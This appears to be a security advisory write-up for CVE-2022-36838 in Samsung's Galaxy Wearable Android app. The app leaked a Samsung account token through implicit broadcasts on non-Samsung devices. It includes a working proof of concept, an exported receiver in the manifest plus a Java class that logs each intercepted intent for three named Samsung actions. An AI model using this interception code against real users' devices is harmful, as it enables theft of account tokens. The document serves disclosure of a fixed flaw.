# Details

<table>
    <tr>
        <td>Name</td>
        <td>Galaxy Wearable</td>
    </tr>
    <tr>
        <td>Package name</td>
        <td><code>com.samsung.android.app.watchmanager</code></td>
    </tr>
    <tr>
        <td>Reported date</td>
        <td>2022.04.18</td>
    </tr>
    <tr>
        <td>Fixed date</td>
        <td>2022.08.02</td>
    </tr>
    <tr>
        <td>Severity</td>
        <td>Moderate</td>
    </tr>
    <tr>
        <td>Handle</td>
        <td><a href="https://nvd.nist.gov/vuln/detail/CVE-2022-36838">CVE-2022-36838</a> (SVE-2022-0947)</td>
    </tr>
    <tr>
        <td>Reward</td>
        <td>$1460</td>
    </tr>
</table>

# Description

Oversecured report:
![](04%20رئيسية/Samsung%20Vulnerabilities/050.%20Galaxy%20Wearable%20—%20Token%20leakage%20on%20non-Samsung%20devices/Oversecured_report.png)

Oversecured found the use of implicit intents to send broadcasts that contained sensitive information. One of the intents revealed a user token to access a Samsung account when the app was launched on a non-Samsung device.

**Proof of Concept**

File `AndroidManifest.xml`:
```xml
<receiver android:name=".MyReceiver" android:exported="true">
    <intent-filter>
        <action android:name="com.samsung.uhm.action.UPDATE_AVAILABLE" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.app.watchmanager.ACTION_SA_WEBVIEW_LOGIN_SUCCESS" />
    </intent-filter>
    <intent-filter>
        <action android:name="com.samsung.android.uhm.db.CONNECTION_UPDATED" />
    </intent-filter>
</receiver>
```

File `MyReceiver.java`:
```java
public class MyReceiver extends BroadcastReceiver {
    public void onReceive(Context context, Intent intent) {
        DumpUtils.dump(intent, getClass().getClassLoader());
    }
}
```

The implementation of the `DumpUtils.dump()` method can be found in the source code. We use the functionality of the Gson library to turn objects of any class into a string and then dump it to the log.

## References

- [Oversecured Blog. Interception of Android implicit intents](https://blog.oversecured.com/Interception-of-Android-implicit-intents/)
